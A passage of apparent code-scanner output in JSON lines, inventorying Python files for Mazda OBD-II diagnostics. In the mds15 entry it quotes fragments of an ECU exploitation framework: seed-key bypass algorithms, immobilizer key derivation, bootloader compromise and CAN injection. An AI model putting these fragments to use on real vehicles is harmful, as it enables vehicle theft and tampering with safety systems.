'') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 456, "hardware": "ECU", "content": "mazda_ecus_found += 1"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "if mazda_ecus_found >= 3:"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "health_status['recommendations'].append(\"Multiple Mazda ECUs detected - bus communication normal\")"}, {"type": "hardware", "line": 460, "hardware": "ECU", "content": "elif mazda_ecus_found > 0:"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "health_status['recommendations'].append(\"Some Mazda ECUs detected - check missing modules\")"}, {"type": "hardware", "line": 463, "hardware": "ECU", "content": "health_status['recommendations'].append(\"No Mazda ECUs detected - check vehicle connection\")"}, {"type": "hardware", "line": 463, "hardware": "vehicle", "content": "health_status['recommendations'].append(\"No Mazda ECUs detected - check vehicle connection\")"}, {"type": "hardware", "line": 465, "hardware": "CAN bus", "content": "logger.info(\"CAN bus health check completed\")"}, {"type": "hardware", "line": 475, "hardware": "CAN bus", "content": "Set CAN bus bitrate"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds13.py", "lines_read": 612, "features_found": [{"type": "function", "name": "__init__", "line": 35}, {"type": "function", "name": "connect", "line": 44}, {"type": "function", "name": "_initialize_obd", "line": 80}, {"type": "function", "name": "_auto_detect_protocol", "line": 124}, {"type": "function", "name": "disconnect", "line": 147}, {"type": "function", "name": "_send_command", "line": 160}, {"type": "function", "name": "read_pid", "line": 201}, {"type": "function", "name": "_parse_pid_response", "line": 224}, {"type": "function", "name": "read_multiple_pids", "line": 285}, {"type": "function", "name": "read_live_data", "line": 304}, {"type": "function", "name": "_calculate_live_data_statistics", "line": 361}, {"type": "function", "name": "read_diagnostic_trouble_codes", "line": 386}, {"type": "function", "name": "_parse_dtc_code", "line": 426}, {"type": "function", "name": "clear_diagnostic_trouble_codes", "line": 451}, {"type": "function", "name": "read_vehicle_information", "line": 471}, {"type": "function", "name": "_update_supported_pids", "line": 519}, {"type": "function", "name": "get_supported_pids", "line": 543}, {"type": "function", "name": "perform_obd_health_check", "line": 552}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}], "components_found": [{"type": "class", "name": "OBDProtocol", "line": 16}, {"type": "class", "name": "MazdaOBDInterface", "line": 29}], "algorithms": [{"type": "algorithm_function", "line": 361, "content": "def _calculate_live_data_statistics(self, samples: List[Dict[str, Any]]) -> Dict[str, Any]:"}], "protocols": [{"type": "protocol", "line": 4, "protocol": "OBD", "content": "OBD INTERFACE - Complete OBD-II Implementation"}, {"type": "protocol", "line": 5, "protocol": "OBD", "content": "Standard OBD-II interface for Mazda vehicles"}, {"type": "protocol", "line": 16, "protocol": "OBD", "content": "class OBDProtocol(IntEnum):"}, {"type": "protocol", "line": 17, "protocol": "OBD", "content": "\"\"\"OBD-II Protocols\"\"\""}, {"type": "protocol", "line": 20, "protocol": "KWP", "content": "ISO_14230_4_KWP = 2"}, {"type": "protocol", "line": 21, "protocol": "KWP", "content": "ISO_14230_4_KWP_FAST = 3"}, {"type": "protocol", "line": 22, "protocol": "CAN", "content": "ISO_15765_4_CAN_11B_500K = 4"}, {"type": "protocol", "line": 23, "protocol": "CAN", "content": "ISO_15765_4_CAN_29B_500K = 5"}, {"type": "protocol", "line": 24, "protocol": "CAN", "content": "ISO_15765_4_CAN_11B_250K = 6"}, {"type": "protocol", "line": 25, "protocol": "CAN", "content": "ISO_15765_4_CAN_29B_250K = 7"}, {"type": "protocol", "line": 29, "protocol": "OBD", "content": "class MazdaOBDInterface:"}, {"type": "protocol", "line": 31, "protocol": "OBD", "content": "Complete OBD-II Interface for Mazda Vehicles"}, {"type": "protocol", "line": 32, "protocol": "OBD", "content": "Provides standard OBD-II communication with Mazda-specific extensions"}, {"type": "protocol", "line": 36, "protocol": "OBD", "content": "protocol: OBDProtocol = OBDProtocol.AUTO):"}, {"type": "protocol", "line": 46, "protocol": "OBD", "content": "Connect to OBD-II interface"}, {"type": "protocol", "line": 52, "protocol": "OBD", "content": "logger.info(f\"Connecting to OBD-II interface: {self.port}\")"}, {"type": "protocol", "line": 66, "protocol": "OBD", "content": "logger.error(\"Failed to initialize OBD connection\")"}, {"type": "protocol", "line": 72, "protocol": "OBD", "content": "logger.info(\"Successfully connected to OBD-II interface\")"}, {"type": "protocol", "line": 76, "protocol": "OBD", "content": "logger.error(f\"Failed to connect to OBD-II interface: {e}\")"}, {"type": "protocol", "line": 81, "protocol": "OBD", "content": "\"\"\"Initialize OBD connection\"\"\""}, {"type": "protocol", "line": 94, "protocol": "OBD", "content": "if self.protocol == OBDProtocol.AUTO:"}, {"type": "protocol", "line": 100, "protocol": "CAN", "content": "self.protocol = OBDProtocol.ISO_15765_4_CAN_11B_500K"}, {"type": "protocol", "line": 100, "protocol": "OBD", "content": "self.protocol = OBDProtocol.ISO_15765_4_CAN_11B_500K"}, {"type": "protocol", "line": 107, "protocol": "OBD", "content": "self.protocol = OBDProtocol.AUTO"}, {"type": "protocol", "line": 121, "protocol": "OBD", "content": "logger.error(f\"Error initializing OBD: {e}\")"}, {"type": "protocol", "line": 124, "protocol": "OBD", "content": "def _auto_detect_protocol(self) -> Optional[OBDProtocol]:"}, {"type": "protocol", "line": 125, "protocol": "OBD", "content": "\"\"\"Auto-detect OBD protocol\"\"\""}, {"type": "protocol", "line": 127, "protocol": "CAN", "content": "OBDProtocol.ISO_15765_4_CAN_11B_500K,  # Most common for modern Mazdas"}, {"type": "protocol", "line": 127, "protocol": "OBD", "content": "OBDProtocol.ISO_15765_4_CAN_11B_500K,  # Most common for modern Mazdas"}, {"type": "protocol", "line": 128, "protocol": "OBD", "content": "OBDProtocol.ISO_14230_4_KWP,           # KWP2000 for older Mazdas"}, {"type": "protocol", "line": 128, "protocol": "KWP", "content": "OBDProtocol.ISO_14230_4_KWP,           # KWP2000 for older Mazdas"}, {"type": "protocol", "line": 129, "protocol": "OBD", "content": "OBDProtocol.ISO_9141_2,                # K-line for older vehicles"}, {"type": "protocol", "line": 148, "protocol": "OBD", "content": "\"\"\"Disconnect from OBD-II interface\"\"\""}, {"type": "protocol", "line": 155, "protocol": "OBD", "content": "logger.info(\"Disconnected from OBD-II interface\")"}, {"type": "protocol", "line": 158, "protocol": "OBD", "content": "logger.error(f\"Error disconnecting from OBD-II interface: {e}\")"}, {"type": "protocol", "line": 162, "protocol": "OBD", "content": "Send command to OBD interface and read response"}, {"type": "protocol", "line": 165, "protocol": "OBD", "content": "command: OBD command to send"}, {"type": "protocol", "line": 172, "protocol": "OBD", "content": "logger.error(\"OBD interface not connected\")"}, {"type": "protocol", "line": 194, "protocol": "OBD", "content": "logger.debug(f\"OBD Command: {command} -> Response: {response}\")"}, {"type": "protocol", "line": 198, "protocol": "OBD", "content": "logger.error(f\"Error sending OBD command: {e}\")"}, {"type": "protocol", "line": 203, "protocol": "OBD", "content": "Read OBD PID value"}, {"type": "protocol", "line": 203, "protocol": "PID", "content": "Read OBD PID value"}, {"type": "protocol", "line": 206, "protocol": "PID", "content": "pid: PID to read (e.g., \"010C\" for RPM)"}, {"type": "protocol", "line": 209, "protocol": "PID", "content": "PID data or None if failed"}, {"type": "protocol", "line": 221, "protocol": "PID", "content": "logger.error(f\"Error reading PID {pid}: {e}\")"}, {"type": "protocol", "line": 225, "protocol": "PID", "content": "\"\"\"Parse PID response\"\"\""}, {"type": "protocol", "line": 281, "protocol": "PID", "content": "logger.error(f\"Error parsing PID response: {e}\")"}, {"type": "protocol", "line": 287, "protocol": "PID", "content": "Read multiple PIDs"}, {"type": "protocol", "line": 290, "protocol": "PID", "content": "pids: List of PIDs to read"}, {"type": "protocol", "line": 293, "protocol": "PID", "content": "Dictionary of PID values"}, {"type": "protocol", "line": 306, "protocol": "PID", "content": "Read live data from multiple PIDs over time"}, {"type": "protocol", "line": 309, "protocol": "PID", "content": "pids: PIDs to monitor"}, {"type": "protocol", "line": 435, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (first_byte >> 6) & 0x03"}, {"type": "protocol", "line": 440, "protocol": "0x[0-9A-Fa-f]+", "content": "digit1 = (first_byte >> 4) & 0x03"}, {"type": "protocol", "line": 441, "protocol": "0x[0-9A-Fa-f]+", "content": "digit2 = first_byte & 0x0F"}, {"type": "protocol", "line": 520, "protocol": "PID", "content": "\"\"\"Update list of supported PIDs\"\"\""}, {"type": "protocol", "line": 534, "protocol": "0x[0-9A-Fa-f]+", "content": "pid_num = (i//2) * 0x20 + bit + 1"}, {"type": "protocol", "line": 538, "protocol": "PID", "content": "logger.debug(f\"Supported PIDs: {list(self.vehicle_supported_pids.keys())}\")"}, {"type": "protocol", "line": 541, "protocol": "PID", "content": "logger.error(f\"Error updating supported PIDs: {e}\")"}, {"type": "protocol", "line": 545, "protocol": "PID", "content": "Get list of supported PIDs"}, {"type": "protocol", "line": 548, "protocol": "PID", "content": "List of supported PID codes"}, {"type": "protocol", "line": 554, "protocol": "OBD", "content": "Perform OBD system health check"}, {"type": "protocol", "line": 575, "protocol": "OBD", "content": "health_status['recommendations'].append(\"Check OBD connection and protocol\")"}, {"type": "protocol", "line": 590, "protocol": "0x[0-9A-Fa-f]+", "content": "if status_byte & 0x80:  # MIL status"}, {"type": "protocol", "line": 600, "protocol": "PID", "content": "health_status['recommendations'].append(\"No supported PIDs detected - check protocol\")"}, {"type": "protocol", "line": 602, "protocol": "PID", "content": "health_status['recommendations'].append(\"Limited PID support - vehicle may have restrictions\")"}, {"type": "protocol", "line": 604, "protocol": "PID", "content": "health_status['recommendations'].append(\"Good PID support detected\")"}, {"type": "protocol", "line": 606, "protocol": "OBD", "content": "logger.info(\"OBD health check completed\")"}, {"type": "protocol", "line": 610, "protocol": "OBD", "content": "logger.error(f\"Error performing OBD health check: {e}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "vehicle", "content": "Standard OBD-II interface for Mazda vehicles"}, {"type": "hardware", "line": 31, "hardware": "vehicle", "content": "Complete OBD-II Interface for Mazda Vehicles"}, {"type": "hardware", "line": 42, "hardware": "vehicle", "content": "self.vehicle_supported_pids = {}"}, {"type": "hardware", "line": 117, "hardware": "vehicle", "content": "logger.error(\"No response from vehicle\")"}, {"type": "hardware", "line": 129, "hardware": "vehicle", "content": "OBDProtocol.ISO_9141_2,                # K-line for older vehicles"}, {"type": "hardware", "line": 248, "hardware": "vehicle", "content": "elif pid == \"010D\":  # Vehicle Speed"}, {"type": "hardware", "line": 471, "hardware": "vehicle", "content": "def read_vehicle_information(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 473, "hardware": "vehicle", "content": "Read vehicle information"}, {"type": "hardware", "line": 476, "hardware": "vehicle", "content": "Vehicle information"}, {"type": "hardware", "line": 478, "hardware": "vehicle", "content": "vehicle_info = {}"}, {"type": "hardware", "line": 494, "hardware": "vehicle", "content": "vehicle_info['vin'] = vin.strip()"}, {"type": "hardware", "line": 508, "hardware": "vehicle", "content": "vehicle_info['calibration_id'] = cal_id.strip()"}, {"type": "hardware", "line": 512, "hardware": "vehicle", "content": "return vehicle_info"}, {"type": "hardware", "line": 515, "hardware": "vehicle", "content": "logger.error(f\"Error reading vehicle information: {e}\")"}, {"type": "hardware", "line": 516, "hardware": "vehicle", "content": "vehicle_info['error'] = str(e)"}, {"type": "hardware", "line": 517, "hardware": "vehicle", "content": "return vehicle_info"}, {"type": "hardware", "line": 536, "hardware": "vehicle", "content": "self.vehicle_supported_pids[pid_hex] = True"}, {"type": "hardware", "line": 538, "hardware": "vehicle", "content": "logger.debug(f\"Supported PIDs: {list(self.vehicle_supported_pids.keys())}\")"}, {"type": "hardware", "line": 550, "hardware": "vehicle", "content": "return list(self.vehicle_supported_pids.keys())"}, {"type": "hardware", "line": 562, "hardware": "vehicle", "content": "'supported_pids': len(self.vehicle_supported_pids),"}, {"type": "hardware", "line": 602, "hardware": "vehicle", "content": "health_status['recommendations'].append(\"Limited PID support - vehicle may have restrictions\")"}], "security_logic": [{"type": "security_pattern", "line": 370, "pattern": "key", "content": "pids = list(first_sample['values'].keys())"}, {"type": "security_pattern", "line": 538, "pattern": "key", "content": "logger.debug(f\"Supported PIDs: {list(self.vehicle_supported_pids.keys())}\")"}, {"type": "security_pattern", "line": 550, "pattern": "key", "content": "return list(self.vehicle_supported_pids.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds14.py", "lines_read": 571, "features_found": [{"type": "function", "name": "bytes_to_uint8", "line": 31}, {"type": "function", "name": "bytes_to_int8", "line": 38}, {"type": "function", "name": "bytes_to_uint16", "line": 48}, {"type": "function", "name": "bytes_to_int16", "line": 59}, {"type": "function", "name": "bytes_to_uint32", "line": 67}, {"type": "function", "name": "bytes_to_float", "line": 80}, {"type": "function", "name": "mazda_rpm_to_bytes", "line": 89}, {"type": "function", "name": "bytes_to_mazda_rpm", "line": 96}, {"type": "function", "name": "mazda_temperature_to_bytes", "line": 102}, {"type": "function", "name": "bytes_to_mazda_temperature", "line": 109}, {"type": "function", "name": "mazda_pressure_to_bytes", "line": 115}, {"type": "function", "name": "bytes_to_mazda_pressure", "line": 121}, {"type": "function", "name": "mazda_voltage_to_bytes", "line": 127}, {"type": "function", "name": "bytes_to_mazda_voltage", "line": 133}, {"type": "function", "name": "mazda_angle_to_bytes", "line": 139}, {"type": "function", "name": "bytes_to_mazda_angle", "line": 145}, {"type": "function", "name": "decode_maf_signal", "line": 151}, {"type": "function", "name": "decode_map_signal", "line": 173}, {"type": "function", "name": "decode_tps_signal", "line": 192}, {"type": "function", "name": "decode_oxygen_sensor_signal", "line": 215}, {"type": "function", "name": "calculate_injector_pulse_width", "line": 238}, {"type": "function", "name": "calculate_ignition_timing", "line": 264}, {"type": "function", "name": "calculate_boost_target", "line": 306}, {"type": "function", "name": "convert_afr_to_lambda", "line": 349}, {"type": "function", "name": "convert_lambda_to_afr", "line": 371}, {"type": "function", "name": "calculate_horsepower", "line": 392}, {"type": "function", "name": "calculate_torque", "line": 406}, {"type": "function", "name": "psi_to_kpa", "line": 422}, {"type": "function", "name": "kpa_to_psi", "line": 427}, {"type": "function", "name": "celsius_to_fahrenheit", "line": 432}, {"type": "function", "name": "fahrenheit_to_celsius", "line": 437}, {"type": "function", "name": "decode_mazda_vin", "line": 442}, {"type": "function", "name": "encode_calibration_map", "line": 496}, {"type": "function", "name": "decode_calibration_map", "line": 531}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "math", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}], "components_found": [{"type": "class", "name": "MazdaDataConverter", "line": 13}], "algorithms": [{"type": "algorithm_function", "line": 238, "content": "def calculate_injector_pulse_width(rpm: float, load: float,"}, {"type": "algorithm_function", "line": 264, "content": "def calculate_ignition_timing(base_timing: float, rpm: float, load: float,"}, {"type": "algorithm_function", "line": 306, "content": "def calculate_boost_target(rpm: float, gear: int,"}, {"type": "algorithm_function", "line": 392, "content": "def calculate_horsepower(torque: float, rpm: float) -> float:"}, {"type": "algorithm_function", "line": 406, "content": "def calculate_torque(horsepower: float, rpm: float) -> float:"}], "protocols": [{"type": "protocol", "line": 520, "protocol": "0x[0-9A-Fa-f]+", "content": "encoded_data.append(max(-128, min(127, int_value)) & 0xFF)"}], "hardware_assumptions": [{"type": "hardware", "line": 458, "hardware": "vehicle", "content": "\"vds\": vin[3:9], # Vehicle Descriptor Section"}, {"type": "hardware", "line": 459, "hardware": "vehicle", "content": "\"vis\": vin[9:]   # Vehicle Identifier Section"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds15.py", "lines_read": 456, "features_found": [{"type": "function", "name": "main", "line": 389}, {"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "reverse_engineer_seed_key", "line": 23}, {"type": "function", "name": "_mazda_27_algorithm", "line": 50}, {"type": "function", "name": "_mazda_tcm_algorithm", "line": 64}, {"type": "function", "name": "_mazda_immobilizer_algorithm", "line": 77}, {"type": "function", "name": "_derive_vin_key", "line": 91}, {"type": "function", "name": "map_ecu_memory", "line": 102}, {"type": "function", "name": "__init__", "line": 130}, {"type": "function", "name": "define_safety_limits", "line": 135}, {"type": "function", "name": "real_time_optimization", "line": 147}, {"type": "function", "name": "_optimize_timing", "line": 164}, {"type": "function", "name": "_optimize_boost", "line": 182}, {"type": "function", "name": "_optimize_fuel", "line": 198}, {"type": "function", "name": "_optimize_vvt", "line": 213}, {"type": "function", "name": "_apply_safety_limits", "line": 225}, {"type": "function", "name": "_learn_from_optimization", "line": 242}, {"type": "function", "name": "__init__", "line": 260}, {"type": "function", "name": "enumerate_j2534_exploits", "line": 264}, {"type": "function", "name": "execute_memory_dump", "line": 290}, {"type": "function", "name": "_build_read_memory_payload", "line": 311}, {"type": "function", "name": "__init__", "line": 326}, {"type": "function", "name": "enumerate_ecu_ids", "line": 330}, {"type": "function", "name": "inject_diagnostic_session", "line": 341}, {"type": "function", "name": "security_access_attack", "line": 357}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUExploit", "line": 15}, {"type": "class", "name": "AutonomousTuner", "line": 127}, {"type": "class", "name": "DiagnosticExploits", "line": 257}, {"type": "class", "name": "CANInjection", "line": 323}], "algorithms": [{"type": "algorithm_function", "line": 50, "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 64, "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 77, "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 91, "content": "def _derive_vin_key(self):"}], "protocols": [{"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing': {'address': 0xFFA000, 'size': 0x800, 'description': '16x16 ignition map'},"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_maps': {'address': 0xFFA800, 'size': 0x800, 'description': '16x16 fuel map'},"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_control': {'address': 0xFFB000, 'size': 0x400, 'description': 'Boost target maps'},"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_maps': {'address': 0xFFB400, 'size': 0x400, 'description': 'Variable valve timing'},"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': {'address': 0xFFB800, 'size': 0x100, 'description': 'RPM limiters'},"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': {'address': 0xFFB900, 'size': 0x100, 'description': 'Speed governor'}"}, {"type": "protocol", "line": 114, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn': {'address': 0xFFC000, 'size': 0x200, 'description': 'Knock adaptation'},"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim': {'address': 0xFFC200, 'size': 0x200, 'description': 'Long/short term fuel trims'},"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "'throttle_adapt': {'address': 0xFFC400, 'size': 0x100, 'description': 'Throttle body learning'},"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "'bootloader': {'address': 0xFF0000, 'size': 0x1000, 'description': 'Boot sector - reprogramming'},"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "protocol", "line": 262, "protocol": "CAN", "content": "self.can_injection = CANInjection()"}, {"type": "protocol", "line": 265, "protocol": "J2534", "content": "\"\"\"J2534 PROTOCOL VULNERABILITIES\"\"\""}, {"type": "protocol", "line": 270, "protocol": "CAN", "content": "'exploit': 'CAN ID spoofing + sequence number prediction'"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "'exploit': 'Exploit 0x23 0x2A 0x3D services'"}, {"type": "protocol", "line": 279, "protocol": "0x[0-9A-Fa-f]+", "content": "'target': '0x27 security service',"}, {"type": "protocol", "line": 312, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"BUILD 0x23 READ MEMORY PAYLOAD\"\"\""}, {"type": "protocol", "line": 315, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)  # Service ID"}, {"type": "protocol", "line": 323, "protocol": "CAN", "content": "class CANInjection:"}, {"type": "protocol", "line": 324, "protocol": "CAN", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "protocol", "line": 331, "protocol": "CAN", "content": "\"\"\"MAZDASPEED 3 SPECIFIC CAN IDENTIFIERS\"\"\""}, {"type": "protocol", "line": 333, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu': 0x7E0,"}, {"type": "protocol", "line": 334, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm': 0x7E1,"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs': 0x7E2,"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag': 0x7E3,"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster': 0x7E4,"}, {"type": "protocol", "line": 338, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer': 0x7E5"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x10)  # Service"}, {"type": "protocol", "line": 362, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "protocol", "line": 379, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "FULL SECURITY BYPASS & AUTONOMOUS TUNING FOR STOCK 2011 MAZDASPEED 3"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "class MazdaECUExploit:"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "\"\"\"COMPLETE MAZDASPEED 3 ECU EXPLOITATION FRAMEWORK\"\"\""}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "self.security_level = \"FACTORY_DEALER_ACCESS\""}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "self.ecu_memory_map = self.map_ecu_memory()"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "'ecu_access_27': {"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "hardware", "line": 33, "hardware": "TCM", "content": "'tcm_access_27': {"}, {"type": "hardware", "line": 35, "hardware": "TCM", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "hardware", "line": 40, "hardware": "immobilizer", "content": "'immobilizer_27': {"}, {"type": "hardware", "line": 41, "hardware": "immobilizer", "content": "'description': 'Immobilizer system access',"}, {"type": "hardware", "line": 42, "hardware": "immobilizer", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "hardware", "line": 64, "hardware": "TCM", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 65, "hardware": "TCM", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 77, "hardware": "immobilizer", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "hardware", "line": 78, "hardware": "immobilizer", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "hardware", "line": 92, "hardware": "immobilizer", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "vin = self._read_vin()  # Read VIN from ECU"}, {"type": "hardware", "line": 98, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "def map_ecu_memory(self):"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "\"\"\"COMPLETE MEMORY MAP OF MZR DISI ECU\"\"\""}, {"type": "hardware", "line": 117, "hardware": "TCM", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "hardware", "line": 119, "hardware": "ECU", "content": "'security_areas': {"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "hardware", "line": 273, "hardware": "ECU", "content": "'method': 'Dump entire ECU memory via extended diagnostics',"}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "'target': 'ECU flash memory',"}, {"type": "hardware", "line": 277, "hardware": "ECU", "content": "'security_bypass': {"}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "'method': 'Bypass security access without valid key',"}, {"type": "hardware", "line": 279, "hardware": "ECU", "content": "'target': '0x27 security service',"}, {"type": "hardware", "line": 283, "hardware": "ECU", "content": "'method': 'Compromise ECU bootloader for permanent access',"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "'target': 'Boot sector of ECU',"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "def execute_memory_dump(self):"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "\"\"\"DUMP COMPLETE ECU MEMORY VIA DIAGNOSTIC EXPLOIT\"\"\""}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "for area_name, area_info in MazdaECUExploit().ecu_memory_map.items():"}, {"type": "hardware", "line": 324, "hardware": "CAN bus", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "self.ecu_ids = self.enumerate_ecu_ids()"}, {"type": "hardware", "line": 330, "hardware": "ECU", "content": "def enumerate_ecu_ids(self):"}, {"type": "hardware", "line": 333, "hardware": "ECU", "content": "'engine_ecu': 0x7E0,"}, {"type": "hardware", "line": 334, "hardware": "TCM", "content": "'tcm': 0x7E1,"}, {"type": "hardware", "line": 335, "hardware": "ABS", "content": "'abs': 0x7E2,"}, {"type": "hardware", "line": 338, "hardware": "immobilizer", "content": "'immobilizer': 0x7E5"}, {"type": "hardware", "line": 341, "hardware": "ECU", "content": "def inject_diagnostic_session(self, target_ecu, session_type):"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "return f\"Started {session_type} session on {target_ecu}\""}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "def security_access_attack(self, target_ecu):"}, {"type": "hardware", "line": 358, "hardware": "ECU", "content": "\"\"\"AUTOMATED 